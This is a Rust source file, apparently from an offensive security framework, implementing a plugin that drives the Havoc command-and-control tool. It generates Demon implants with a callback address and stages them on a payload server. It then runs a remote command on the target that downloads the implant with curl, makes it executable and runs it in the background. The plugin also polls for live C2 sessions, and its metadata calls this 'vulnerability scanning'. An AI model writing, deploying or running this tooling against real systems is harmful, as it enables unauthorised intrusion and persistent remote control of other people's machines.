use crate::plugins::{ScannerPlugin, Capability};
use crate::models::{TargetHost, Finding, Severity, Category};
use crate::utils::tool_detection::detect_tool;
use crate::core::c2::{C2Operator, C2Session, SessionState};
use async_trait::async_trait;
use anyhow::{Result, Context};
use tracing::{info, warn};
use std::sync::Arc;
use crate::utils::executor::{StealthExecutor, ExecutorMode};

pub struct HavocScanner<M: ExecutorMode> {
    binary_path: String,
    executor: Arc<StealthExecutor<M>>,
}

impl<M: ExecutorMode> HavocScanner<M> {
    pub fn new(executor: Arc<StealthExecutor<M>>) -> Self {
        let path = detect_tool("havoc");
        Self {
            binary_path: path,
            executor,
        }
    }

    async fn get_rest_client(&self) -> Result<reqwest::Client> {
        let server_addr = std::env::var("HAVOC_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
        let pm = self.executor.get_proxy_manager()
            .context("Havoc requires a ProxyManager for REST API access")?;
            
        let (_, client) = if server_addr == "127.0.0.1" || server_addr == "localhost" {
            pm.get_localhost_client(&server_addr)?
        } else {
            pm.get_client_fail_closed(&server_addr)?
        };
        Ok(client)
    }
}

#[async_trait]
impl<M: ExecutorMode> C2Operator for HavocScanner<M> {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        let pm = self.executor.get_proxy_manager()
            .context("Havoc requires a ProxyManager for callback tracking")?;
        let callback_ip = pm.get_managed_exits().first().cloned()
            .unwrap_or_else(|| "127.0.0.1".to_string());
            
        info!("🔱 V14.1 SOVEREIGN: Generating Havoc Demon for {} via callback {}", target.host, callback_ip);
        
        let output_path = format!("/tmp/demon_{}.bin", target.host.replace('.', "_"));
        
        let args = vec![
            "generate".to_string(),
            "demon".to_string(),
            "--host".to_string(),
            callback_ip.clone(),
            "--out".to_string(),
            output_path.clone(),
        ];

        let output = self.executor.execute_and_wait(&self.binary_path, args)
            .await
            .context("Failed to generate havoc payload")?;

        if output.status.success() {
            Ok(output_path)
        } else {
            anyhow::bail!("Havoc payload generation failed: {}", String::from_utf8_lossy(&output.stderr))
        }
    }

    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!("🔱 V14.1 SOVEREIGN: Initializing Professional OTT Delivery for Havoc Demon on {}...", target.host);
        
        let pm = self.executor.get_proxy_manager().context("ProxyManager required for delivery")?;
        
        // 1. Stage payload on OTT server
        let server = Arc::new(crate::utils::payload_server::PayloadServer::new());
        let token = server.stage_payload(std::path::PathBuf::from(payload_path));
        let server_port = server.clone().start().await?;
        
        // 2. Determine delivery IP
        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        
        let implant_name = std::path::Path::new(payload_path)
            .file_name().and_then(|n| n.to_str()).unwrap_or("demon");

        // 3. Construct the delivery vector
        let delivery_cmd = format!(
            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && /tmp/{} &",
            delivery_ip, server_port, token, implant_name, implant_name, implant_name
        );

        info!("🚀 V14.1 SOVEREIGN: Dispatching Havoc OTT delivery to remote target...");
        
        // 4. Remote dispatch
        let output = self.executor.execute_remote(target, &delivery_cmd).await?;
        info!("✅ V14.1 SOVEREIGN: Havoc delivery dispatched. Output: {}", output);

        Ok(())
    }

    async fn verify_session(&self, target: &TargetHost) -> Result<SessionState> {
        let sessions = self.list_sessions().await?;
        for sess in sessions {
            if sess.target.contains(&target.host) || (target.ip.is_some() && sess.target.contains(target.ip.as_ref().unwrap())) {
                return Ok(SessionState::Sovereign);
            }
        }
        Ok(SessionState::Staged)
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let client = self.get_rest_client().await?;
        
        let server_url = std::env::var("HAVOC_API_URL").unwrap_or_else(|_| "http://127.0.0.1:8080".to_string());
        let response = client.get(format!("{}/api/sessions", server_url))
            .send()
            .await;

        match response {
            Ok(res) if res.status().is_success() => {
                let json: serde_json::Value = res.json().await?;
                let mut sessions = Vec::new();
                if let Some(sess_list) = json.as_array() {
                    for s in sess_list {
                        sessions.push(C2Session {
                            id: s.get("AgentID").or_else(|| s.get("ID")).and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            target: s.get("ExternalIP").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            state: SessionState::Established,
                            last_checkin: chrono::Utc::now(),
                        });
                    }
                }
                Ok(sessions)
            }
            _ => {
                warn!("⚠️ V14.1 SOVEREIGN: Havoc REST API unreachable. Falling back to CLI.");
                let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
                let mut sessions = Vec::new();
                let stdout = String::from_utf8_lossy(&output.stdout);
                for l in stdout.lines() {
                    sessions.push(C2Session {
                        id: "cli".to_string(),
                        target: l.to_string(),
                        state: SessionState::Established,
                        last_checkin: chrono::Utc::now(),
                    });
                }
                Ok(sessions)
            }
        }
    }
}

#[async_trait]
impl<M: ExecutorMode> ScannerPlugin for HavocScanner<M> {
    fn name(&self) -> &'static str {
        crate::models::PLUGIN_HAVOC
    }
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            name: self.name().to_string(),
            description: "Havoc C2 Operator: Manages Demon payloads and orchestrates session persistence.".to_string(),
            target_type: crate::plugins::TargetType::Host,
            risk_level: crate::plugins::RiskLevel::High,
            layer: crate::core::capability_layer::ScanLayer::PostExploitation,
            expected_duration: std::time::Duration::from_secs(300),
            capabilities: self.capabilities(),
            cost: 10,
            category: "Persistence".to_string(),
            mitre_attacks: vec!["T1543".to_string(), "T1053".to_string()],
            remediation_difficulty: crate::plugins::RiskLevel::High,
            blackarch_category: Some("persistence".to_string()),
            is_destructive: false,
            poc_mode: false,
        }
    }
    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::VulnerabilityScanning]
    }
    async fn check_dependencies(&self) -> Result<bool> {
        Ok(crate::utils::check_tool_availability("havoc").await)
    }
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        
        let state = self.verify_session(target).await?;
        if state == SessionState::Sovereign {
             findings.push(Finding::new(
                "HAVOC-SESSION-ESTABLISHED",
                Category::Vulnerability,
                Severity::Critical,
                &format!("Active Havoc Demon session confirmed for {}.", target.host),
                serde_json::json!({ "status": "active" })
            ));
        } else {
            let path = self.prepare_payload(target).await?;
            findings.push(Finding::new(
                "HAVOC-PAYLOAD-READY",
                Category::Vulnerability,
                Severity::High,
                &format!("Havoc Demon payload profile successfully generated: {}", path),
                serde_json::json!({ "path": path })
            ));
        }

        Ok(findings)
    }

    fn as_c2_operator(&self) -> Option<&dyn C2Operator> {
        Some(self)
    }
}
